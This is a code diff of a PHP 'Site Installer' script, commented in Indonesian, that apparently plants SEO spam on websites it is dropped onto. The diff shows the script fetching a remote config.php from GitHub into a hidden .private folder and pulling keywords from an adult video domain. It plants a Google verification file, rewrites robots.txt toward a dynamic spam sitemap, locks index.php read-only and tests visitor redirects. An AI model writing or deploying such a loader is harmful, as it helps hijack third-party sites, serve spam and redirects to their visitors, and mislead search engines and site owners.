@@ -13,7 +13,7 @@ $clean_host = str_replace('www.', '', $host);
 $full_domain_url = $protocol . $host; // Domain lengkap DENGAN www jika ada
 
 // URL Download
-$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php'; 
+$config_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/config.php'; 
 $google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
 $keyword_url = 'https://player.javpornsub.net/keyword/default.txt'; 
 $base_content_url_path = 'https://player.javpornsub.net/content/';
@@ -22,9 +22,10 @@ $base_content_url_path = 'https://player.javpornsub.net/content/';
 $cache_dir = $server_path . '/.private';
 $local_config_path = $cache_dir . '/config.php';
 $local_json_content_path = $cache_dir . '/content.json'; 
+$local_keyword_path = $cache_dir . '/default.txt'; // <-- TAMBAHKAN BARIS INI
 $local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
 $local_robots_path = $server_path . '/robots.txt';
-$local_sitemap_path = $server_path . '/sitemap.xml'; 
+$local_sitemap_path = $server_path . '/sitemap.xml';
 
 // --- [FUNGSI HELPER] ---
 
@@ -73,7 +74,8 @@ function fetchRawUrl($url) {
 
 function buat_robots_txt($domain) {
     global $local_robots_path;
-    $sitemapUrl = 'https://' . $domain . '/sitemap.xml';
+    // Modifikasi: Arahkan ke sitemap dinamis
+    $sitemapUrl = 'https://' . $domain . '/index.php?sitemap.xml'; // <-- BARIS INI DIUBAH
     $robotsContent = "User-agent: *\nAllow: /\n\nSitemap: $sitemapUrl\n";
     if (@file_put_contents($local_robots_path, $robotsContent)) {
         return true;
@@ -143,47 +145,28 @@ function jalankan_instalasi() {
     } else {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal buat robots.txt.'];
     }
+   // 5. Unduh dan Simpan Keywords (Metode Raw)
+    global $local_keyword_path; // Ambil path yang baru kita buat
     
-    // 5. Buat Sitemap
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh keywords (default.txt)...'];
-    $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
-    if (empty($keywords)) {
-         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh keywords. Sitemap tidak dibuat.'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh keywords (default.txt) mentah...'];
+    
+    // Gunakan fetchRawUrl(), sama seperti config.php
+    $keyword_content = fetchRawUrl($derived_keyword_url); 
+    
+    if ($keyword_content === false || empty(trim($keyword_content))) {
+         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh keywords mentah. Sitemap tidak akan bekerja.'];
          tampilkan_log_terminal($logs, 'final_error'); return;
     }
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Found ' . count($keywords) . ' keywords. Buat sitemap...'];
-    $total_keywords = count($keywords);
-    $base_url = $protocol . $clean_host; // Perbaikan (Request 1)
-    $now = date('Y-m-d\TH:i:s+07:00');
-    $urls_per_map = 10000;
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set batas ' . $urls_per_map . ' URL/sitemap.'];
-    $num_maps = ceil($total_keywords / $urls_per_map);
-    if ($num_maps == 0) $num_maps = 1;
-    for ($i = 1; $i <= $num_maps; $i++) {
-        $sitemap_file = 'sitemap-' . $i . '.xml';
-        $sitemap_path_sub = $server_path . '/' . $sitemap_file;
-        $offset = ($i - 1) * $urls_per_map;
-        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);
-        $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
-        $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
-        foreach ($keywords_chunk as $keyword) {
-            $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword)); // Perbaikan (Request 1)
-            $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
-        }
-        $xml_sub .= '</urlset>' . PHP_EOL;
-        @file_put_contents($sitemap_path_sub, $xml_sub);
+    
+    // Simpan ke .private/default.txt
+    if (@file_put_contents($local_keyword_path, $keyword_content)) {
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Keywords disimpan ke .private/default.txt'];
+    } else {
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan .private/default.txt. Cek izin folder.'];
+        tampilkan_log_terminal($logs, 'final_error'); return;
     }
-    $xml_index = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
-    $xml_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
-    for ($i = 1; $i <= $num_maps; $i++) {
-        $map_url = $base_url . '/sitemap-' . $i . '.xml'; // Perbaikan (Request 1)
-        $xml_index .= '  <sitemap><loc>' . htmlspecialchars($map_url) . '</loc><lastmod>' . $now . '</lastmod></sitemap>' . PHP_EOL;
-    }
-    $xml_index .= '</sitemapindex>' . PHP_EOL;
-    @file_put_contents($local_sitemap_path, $xml_index);
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index & $num_maps sub-sitemap dibuat."];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];
 
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];
     // 6. Chmod index.php
     $index_path = $server_path . '/index.php';
     if (@chmod($index_path, 0444)) {
@@ -325,7 +308,7 @@ function tampilkan_halaman_installer() {
 function tampilkan_prompt_cek_redirect($logs) {
     global $self_script_name, $full_domain_url;
     // URL untuk tes redirect
-    $test_url = $full_domain_url . '/index.php?id=wanz-895-english-subtitle';
+    $test_url = $full_domain_url . '/index.php?id=kitano-mina';
     
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain: ' . htmlspecialchars($full_domain_url)];
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk:'];
@@ -573,7 +556,7 @@ function tampilkan_log_terminal($logs, $next_action = 'done') {
         <div class="terminal">
             <div class="terminal-header">
                 <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">loader.php (Site Installer)</div>
+                <div style="color: #666; font-size: 10px;">x.php (Site Installer)</div>
             </div>
             <div class="terminal-content" id="terminalContent">
                 <div id="logsContainer"></div>
@@ -636,7 +619,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'install') {
     exit;
 } 
 
-// TAHAP 1: User membuka loader.php pertama kali.
+// TAHAP 1: User membuka x.php pertama kali.
 else {
     tampilkan_halaman_installer();
     exit;
